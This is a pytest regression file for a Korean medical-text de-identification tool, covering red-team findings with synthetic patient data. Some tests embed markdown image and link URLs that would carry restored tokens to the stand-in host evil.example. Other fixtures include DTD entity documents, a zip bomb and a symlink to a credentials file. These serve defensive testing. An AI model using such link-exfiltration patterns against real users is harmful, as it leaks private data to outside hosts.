"""Regression tests for the red-team findings fixed during final integration.

Each test name carries the finding id. Synthetic people only.
"""
from __future__ import annotations

import io
import os
import signal
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

import pytest
from PIL import Image, ImageDraw, ImageFont

from deid import cli, formats, ocr, web
from deid.anonymizer import Anonymizer
from deid.api import deidentify
from deid.config import default_config
from deid.engine import Detector
from deid.formats import docx as D
from deid.formats import image as I
from deid.vault import Vault, link_spans
from deid.watch import WatchState, watch_once

FONT_DIR = Path("/usr/share/fonts/truetype/nanum")
needs_fonts = pytest.mark.skipif(not (FONT_DIR / "NanumBarunGothic.ttf").exists(),
                                 reason="Nanum fonts not installed")


# ---------------------------------------------------------------------- tl01 via the API


def test_tl01_tsv_clipboard_headers_deidentify_api():
    text = ("환자명\t성별\t나이\t연락처\t진단\n"
            "하은별\tF\t34\t010-2233-4455\t편두통\n"
            "도윤재\tM\t51\t010-9988-7766\t고혈압\n")
    out, report = deidentify(text)
    for raw in ("하은별", "도윤재", "2233-4455", "9988-7766"):
        assert raw not in out
    assert out.count("\t") == text.count("\t") and out.count("\n") == text.count("\n")
    assert "편두통" in out and "고혈압" in out and report.counts.get("PERSON") == 2


# ---------------------------------------------------------------------- web temp folders


def _dead_pid() -> int:
    p = subprocess.Popen([sys.executable, "-c", "pass"])
    p.wait()
    return p.pid


def test_security_web_tempfile_leftover_sweep(tmp_path):
    def make(name: str, age: float = 0.0) -> Path:
        d = tmp_path / name
        (d / "in").mkdir(parents=True)
        (d / "in" / "김민서_진료.png").write_bytes(b"original upload")
        if age:
            t = time.time() - age
            os.utime(d, (t, t))
        return d

    dead = make(f"deid-web-{_dead_pid()}-abcd1234")
    own = make(f"deid-web-{os.getpid()}-abcd1234")
    live = make(f"deid-web-{os.getppid()}-abcd1234")
    legacy_old = make("deid-web-old12345", age=2 * web.STALE_WORK_AGE)
    legacy_new = make("deid-web-new12345")
    other = make("something-else")
    assert web.sweep_work_dirs(tmp_path) == 2
    assert not dead.exists() and not legacy_old.exists()
    assert own.exists() and live.exists() and legacy_new.exists() and other.exists()
    assert web.sweep_work_dirs(tmp_path, own=True) == 1
    assert not own.exists() and live.exists()


def test_security_web_tempfile_leftover_work_prefix_has_pid():
    assert web.work_prefix() == f"deid-web-{os.getpid()}-"
    name = Path(tempfile.mkdtemp(prefix=web.work_prefix()))
    try:
        assert web._WORK_DIR.fullmatch(name.name)
    finally:
        name.rmdir()


@pytest.mark.skipif(not hasattr(signal, "SIGHUP"), reason="POSIX signals")
def test_security_web_tempfile_leftover_signals_stop_like_ctrl_c():
    before = signal.getsignal(signal.SIGTERM), signal.getsignal(signal.SIGHUP)
    old = web._stop_on_signals()
    try:
        handler = signal.getsignal(signal.SIGHUP)
        with pytest.raises(KeyboardInterrupt):
            handler(signal.SIGHUP, None)
    finally:
        web._restore_signals(old)
    assert (signal.getsignal(signal.SIGTERM), signal.getsignal(signal.SIGHUP)) == before


def test_security_web_tempfile_leftover_serve_cleans_up(tmp_path, monkeypatch):
    """A killed server's folder is swept at start; serve() removes its own at exit."""
    monkeypatch.setenv("DEID_HOME", str(tmp_path / "home"))
    monkeypatch.setattr(tempfile, "tempdir", str(tmp_path))
    stale = tmp_path / f"deid-web-{_dead_pid()}-zzzz9999"
    (stale / "in").mkdir(parents=True)
    mine = tmp_path / f"deid-web-{os.getpid()}-yyyy8888"
    (mine / "in").mkdir(parents=True)

    def stop(self, poll_interval=0.5):
        raise KeyboardInterrupt

    monkeypatch.setattr(web.DeidServer, "serve_forever", stop)
    assert web.serve(0, open_browser=False, cfg=default_config(), out=io.StringIO()) == 0
    assert not stale.exists() and not mine.exists()


def test_security_web_idle_conns_handler_timeout():
    assert 0 < web._Handler.timeout <= 60


# ---------------------------------------------------------------------- restore and links


def test_security_restore_url_exfil_vault():
    v = Vault()
    tok = v.token_for("PERSON", "김민서", "이름")
    text = (f"{tok} 님은 혈압 추적이 필요합니다.\n"
            f"![t](https://evil.example/c.png?p={tok}) [자세히](https://evil.example/r?id={tok})\n"
            f"www.evil.example/?q={tok} <a href=\"//evil.example/{tok}\">x</a> "
            f"mailto:a@evil.example?body={tok}\n마지막으로 {tok} 님께 안내.")
    out = v.restore(text, links=False)
    assert out.startswith("김민서 님은") and out.endswith("김민서 님께 안내.")
    assert all("김민서" not in out[s:e] for s, e in link_spans(out))
    assert out.count(tok) == 5 and v.tokens_in_links(text) == 5
    assert "김민서" in v.restore(text).split("\n")[1]      # default keeps the old behaviour


def test_security_restore_url_exfil_link_spans_stop_at_space():
    text = "참고 https://example.org/a 그리고 [이름1] 님"
    (s, e), = link_spans(text)
    assert text[s:e] == "https://example.org/a"


def test_security_restore_url_exfil_web(tmp_path, monkeypatch):
    monkeypatch.setenv("DEID_HOME", str(tmp_path / "home"))
    srv = web.DeidServer(0, default_config())
    try:
        d = srv.deid_text("환자 김민서 님 연락처 010-2345-6789")
        tok = d["text"].split()[1]
        r = srv.restore_text(f"{tok} 님 결과: https://evil.example/?p={tok}")
    finally:
        srv.server_close()
    assert r["text"] == f"김민서 님 결과: https://evil.example/?p={tok}"
    assert r["restored"] == 1 and r["in_links"] == 1


def test_security_restore_url_exfil_cli(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("DEID_HOME", str(tmp_path / "home"))
    vault = Vault()
    tok = vault.token_for("PERSON", "김민서", "이름")
    path = tmp_path / "v.vault"
    vault.save(path, "pw")
    monkeypatch.setenv("DEID_VAULT_PASS", "pw")
    data = f"{tok} 님, https://evil.example/?p={tok}\n".encode()
    monkeypatch.setattr(sys, "stdin", io.TextIOWrapper(io.BytesIO(data), encoding="utf-8"))
    assert cli.main(["text", "--restore", "--vault", str(path)]) == 0
    io_ = capsys.readouterr()
    assert io_.out == f"김민서 님, https://evil.example/?p={tok}\n"
    assert "링크" in io_.err


# ---------------------------------------------------------------------- symlinks


@pytest.mark.skipif(not hasattr(os, "symlink"), reason="symlinks")
def test_security_watch_symlink_skipped(tmp_path):
    secret = tmp_path / "private" / "credentials.txt"
    secret.parent.mkdir()
    secret.write_text("aws_secret_access_key = wJalrXUtnFEMIK7MDENGEXAMPLEKEY\n", "utf-8")
    in_dir, out_dir = tmp_path / "in", tmp_path / "out"
    in_dir.mkdir()
    out_dir.mkdir()
    (in_dir / "memo.txt").write_text("특이 소견 없음\n", "utf-8")
    os.symlink(secret, in_dir / "shared-notes.txt")
    os.symlink(secret.parent, in_dir / "linked-folder")
    assert [p.name for p in formats.iter_files(in_dir)] == ["memo.txt"]
    st = WatchState()
    for _ in range(3):
        watch_once(st, in_dir, out_dir, default_config(), log=lambda m: None)
    outs = [p for p in out_dir.rglob("*") if p.is_file()]
    assert outs and all("wJalrXUtnFEMI" not in p.read_text("utf-8", "replace") for p in outs)


# ---------------------------------------------------------------------- OOXML / HWPX DTDs

_DTD_VALUE = "환자 김민서 010-2345-6789"


def _docx_with_dtd(path: Path) -> None:
    import docx
    buf = io.BytesIO()
    d = docx.Document()
    d.add_paragraph("PLACEHOLDER")
    d.save(buf)
    base = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
    xml = base.read("word/document.xml").decode("utf-8")
    xml = xml.replace("?>", f'?><!DOCTYPE w:document [<!ENTITY p "{_DTD_VALUE}">]>', 1)
    xml = xml.replace("PLACEHOLDER", "진료 메모: &p;")
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for info in base.infolist():
            z.writestr(info, xml if info.filename == "word/document.xml" else base.read(info))


def _hwpx_with_dtd(path: Path) -> None:
    from test_formats_hwpx import HP, HS, build
    sec = ('<?xml version="1.0" encoding="UTF-8"?>'
           f'<!DOCTYPE hs:sec [<!ENTITY p "{_DTD_VALUE}">]>'
           f'<hs:sec xmlns:hs="{HS}" xmlns:hp="{HP}"><hp:p><hp:run>'
           '<hp:t>진료 메모: &p;</hp:t></hp:run></hp:p></hs:sec>')
    build(path, sections=(sec,))


@pytest.mark.parametrize("make,ext", [(_docx_with_dtd, ".docx"), (_hwpx_with_dtd, ".hwpx")])
def test_security_ooxml_dtd_refused(tmp_path, make, ext):
    src, dst = tmp_path / f"memo{ext}", tmp_path / f"memo.deid{ext}"
    make(src)
    cfg = default_config()
    with pytest.raises(D.DocumentError, match="DTD"):
        formats.process_file(src, dst, Detector(cfg), Anonymizer(cfg), cfg)
    assert not dst.exists()


def test_security_ooxml_dtd_public_doctype_without_entities_still_parses():
    root = D.parse_xml(b'<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
                       b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
                       b'<svg xmlns="http://www.w3.org/2000/svg"><text>x</text></svg>', "bad")
    assert D.local(root.tag) == "svg"


# ---------------------------------------------------------------------- DOCX ActiveX state


def test_file_leaks_13_docx_activex_binary_emptied(tmp_path):
    import docx
    buf = io.BytesIO()
    d = docx.Document()
    d.add_paragraph("특이 소견 없음")
    d.save(buf)
    base = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
    src, dst = tmp_path / "form.docx", tmp_path / "form.deid.docx"
    with zipfile.ZipFile(src, "w", zipfile.ZIP_DEFLATED) as z:
        for info in base.infolist():
            z.writestr(info, base.read(info))
        z.writestr("word/activeX/activeX1.bin", "보호자 010-7890-0009".encode("utf-16-le"))
    cfg = default_config()
    formats.process_file(src, dst, Detector(cfg), Anonymizer(cfg), cfg)
    assert zipfile.ZipFile(dst).read("word/activeX/activeX1.bin") == b""


# ---------------------------------------------------------------------- XLSX workbook notes


def test_file_leaks_18_xlsx_defined_name_comment_and_scenarios(tmp_path):
    import openpyxl
    from openpyxl.workbook.defined_name import DefinedName
    from openpyxl.worksheet.scenario import InputCells, Scenario, ScenarioList

    wb = openpyxl.Workbook()
    ws = wb.active
    ws.title = "계산"
    ws["A1"], ws["B1"], ws["B2"] = "용량", 10, 20
    wb.defined_names["Dose"] = DefinedName("Dose", attr_text="계산!$B$2",
                                           comment="담당 환자 김말순 010-2345-0003")
    ws.scenarios = ScenarioList(scenario=[Scenario(
        name="환자 이말녀", user="박말자", comment="만든 사람 박말자",
        inputCells=[InputCells(r="B1", val="010-2345-0005")])])
    src, dst = tmp_path / "calc.xlsx", tmp_path / "calc.deid.xlsx"
    wb.save(src)
    cfg = default_config()
    report = formats.process_file(src, dst, Detector(cfg), Anonymizer(cfg), cfg)
    blob = b"".join(zipfile.ZipFile(dst).read(n) for n in zipfile.ZipFile(dst).namelist())
    text = blob.decode("utf-8", "replace")
    for raw in ("김말순", "이말녀", "박말자", "2345-0003", "2345-0005"):
        assert raw not in text
    assert openpyxl.load_workbook(dst).defined_names["Dose"].attr_text == "계산!$B$2"
    assert any("시나리오" in w for w in report.warnings)


# ---------------------------------------------------------------------- Apple Vision boxes


def _line_image(font_file: str, text: str, size: int = 24, underline: bool = False):
    font = ImageFont.truetype(str(FONT_DIR / font_file), size)
    x0, y0 = 20, size
    img = Image.new("RGB", (int(font.getlength(text)) + 40, size * 3), "white")
    d = ImageDraw.Draw(img)
    d.text((x0, y0), text, fill="black", font=font)
    bb = d.textbbox((x0, y0), text, font=font)
    if underline:
        d.line((x0, bb[3] - 1, bb[2], bb[3] - 1), fill="black", width=1)
    return img, font, x0, tuple(float(v) for v in bb)


VISION_TEXT = "MRN 7781234 Name: Kim Seoyun DOB 1985-03-02 Tel 02-345-6789 서울특별시 강남구 테헤란로 123"


@needs_fonts
@pytest.mark.parametrize("font_file", ["NanumBarunGothic.ttf", "NanumGothic.ttf"])
def test_mac_vision_estimated_boxes_word_extents_follow_ink(font_file):
    img, font, x0, bb = _line_image(font_file, VISION_TEXT)
    words = VISION_TEXT.split(" ")
    ext = ocr.ink_word_extents(img.convert("L"), bb, words)
    assert ext is not None and len(ext) == len(words)
    pos = 0
    for w, (a, b) in zip(words, ext):
        start = x0 + font.getlength(VISION_TEXT[:pos])
        end = x0 + font.getlength(VISION_TEXT[:pos + len(w)])
        assert abs(a - start) < 0.3 * 24 and abs(b - end) < 0.3 * 24, w
        pos += len(w) + 1
    line = ocr.line_from_box(VISION_TEXT, bb, 90.0, engine="vision", gray=img.convert("L"))
    assert line.aligned and line.estimated and len(line.char_boxes()) == len(VISION_TEXT)


@needs_fonts
def test_mac_vision_estimated_boxes_unaligned_line_gets_drift_padding():
    img, font, x0, bb = _line_image("NanumBarunGothic.ttf", VISION_TEXT, underline=True)
    line = ocr.line_from_box(VISION_TEXT, bb, 90.0, engine="vision", gray=img.convert("L"))
    assert not line.aligned                      # an underline joins all ink: plain estimate
    i = VISION_TEXT.index("1985-03-02")
    box = line.span_box(i, i + len("1985-03-02"))
    redactor = I._Redactor(img.copy(), default_config(), None, I.Report())
    region = redactor._region(box, line)
    true_end = x0 + font.getlength(VISION_TEXT[:i + len("1985-03-02")])
    true_start = x0 + font.getlength(VISION_TEXT[:i])
    assert region[0] <= true_start and region[2] >= true_end


@needs_fonts
def test_mac_vision_estimated_boxes_spans_fully_painted(monkeypatch):
    img, font, x0, bb = _line_image("NanumBarunGothic.ttf", VISION_TEXT)
    monkeypatch.setattr(ocr, "_is_macos", lambda: True)

    class FakeOCR:
        def __init__(self, image, framework="vision", **kw):
            self.framework = framework

        def recognize(self, px=False):
            if self.framework != "vision":
                raise RuntimeError("vision only")
            return [(VISION_TEXT, 0.5, bb)]

    fake = type(sys)("ocrmac.ocrmac")
    fake.OCR = FakeOCR
    pkg = type(sys)("ocrmac")
    pkg.ocrmac = fake
    monkeypatch.setitem(sys.modules, "ocrmac", pkg)
    monkeypatch.setitem(sys.modules, "ocrmac.ocrmac", fake)
    cfg = default_config()
    cfg.ocr = {"engine": "vision"}
    out, _ = I.redact_image(img, Detector(cfg), cfg)
    src, dst = img.load(), out.load()
    for target in ("Kim Seoyun", "1985-03-02", "02-345-6789"):
        i = VISION_TEXT.index(target)
        xa = int(x0 + font.getlength(VISION_TEXT[:i]))
        xb = int(x0 + font.getlength(VISION_TEXT[:i + len(target)]))
        visible = [x for x in range(xa, xb + 1)
                   if any(sum(src[x, y]) < 300 and dst[x, y] != (0, 0, 0)
                          for y in range(int(bb[1]), int(bb[3])))]
        assert len(visible) <= 3, target


# ---------------------------------------------------------------------- CLI odds and ends


def test_security_zip_bomb_deid_check_refuses(tmp_path, monkeypatch):
    from deid.formats import text as T
    monkeypatch.setattr(T, "ZIP_MAX_ENTRY", 1000)
    path = tmp_path / "big.docx"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml", "<w:document>" + " " * 5000 + "</w:document>")
    with pytest.raises(cli.CliError):
        cli._zip_paragraphs(path, r"word/document\.xml", "p", ("t",))


def test_init_config_documents_image_keys():
    try:
        import tomllib
    except ImportError:  # pragma: no cover - Python 3.10
        import tomli as tomllib
    data = tomllib.loads(cli.EXAMPLE_CONFIG)
    assert "ocr" in data
    for key in ("docx_images", "hwpx_images", "pdf_images", "pdf_dpi", "barcodes"):
        assert f"# {key} = " in cli.EXAMPLE_CONFIG



# ---------------------------------------------------------------------- follow-ups from fixers


@pytest.mark.parametrize("text", ["환자명 | 상병명 | 진료일", "환자명\t상병명\t진료일", "환자명: 진단명 미정"])
def test_emr_header_words_after_name_label_are_not_names(text):
    assert Detector(default_config()).detect(text) == []


def test_emr_header_row_still_finds_real_names():
    spans = Detector(default_config()).detect("환자명 | 김하늘 | 고혈압")
    assert [(s.entity, s.text) for s in spans] == [("PERSON", "김하늘")]


def test_security_image_pixel_bomb_docx_checks_size_before_decoding(tmp_path, monkeypatch):
    import docx
    from docx.shared import Inches

    png = io.BytesIO()
    Image.new("RGB", (400, 300), "white").save(png, "PNG")
    png.seek(0)
    d = docx.Document()
    d.add_paragraph("특이 소견 없음")
    d.add_picture(png, width=Inches(2))
    src, dst = tmp_path / "pic.docx", tmp_path / "pic.deid.docx"
    d.save(src)
    cfg = default_config()
    cfg.ocr = {"docx_images": True, "max_image_pixels": 1000}
    decoded = []
    real_load = Image.Image.load

    def load(self):
        decoded.append(self.size)
        return real_load(self)

    monkeypatch.setattr(Image.Image, "load", load)
    report = formats.process_file(src, dst, Detector(cfg), Anonymizer(cfg), cfg)
    assert (400, 300) not in decoded            # refused from the header, never decoded
    assert dst.exists() and any("이미지" in w for w in report.warnings)


# ---------------------------------------------------------------------- found while integrating


def test_integration_label_with_value_is_not_a_header_row():
    """'주민번호 900101-2345678, 외국인등록번호 ...' in a note used to become a CSV header, and
    every later line with one comma was erased as [주민번호], [외국인번호]."""
    from deid.formats.tabular import column_entity, normalize_header
    assert normalize_header("연락처1") == "연락처" and normalize_header("보호자 12") == "보호자"
    assert column_entity("주민번호 900101-2345678") is None
    assert column_entity("연락처 010-2345-6789") is None
    text = ("주민번호 900101-2345678, 외국인등록번호 900101-5345678\n"
            "연락처 010-2345-6789, 이메일 haneul.kim@example.com\n"
            "생년월일 1990.01.01, 진료일 2025-03-02\n")
    out, _ = deidentify(text)
    lines = out.splitlines()
    assert lines[1].startswith("연락처 010-****-6789, 이메일 [이메일")
    assert lines[2] == "생년월일 1990년생, 진료일 2025-03-02"


@pytest.mark.parametrize("text", [
    "이름, 나이, 성별 확인함\n오늘 오전, 오후 일정 조정, 예정\n다음 주, 다음 달, 재방문",
    "환자명, 진단, 처방\n고혈압, 본태성, 암로디핀\n당뇨, 2형, 메트포르민",
    "Name, Age, Sex\nCough, sputum, fever\nHeadache, nausea, dizziness",
])
def test_integration_comma_prose_under_header_like_line_kept(text):
    out, report = deidentify(text)
    assert out == text and not report.counts


def test_integration_comma_table_with_real_values_still_typed():
    out, report = deidentify("Name, Age, Sex\nEmily Stone, 34, F\nJohn Park, 51, M")
    assert "Emily" not in out and "John Park" not in out and report.counts["PERSON"] == 2
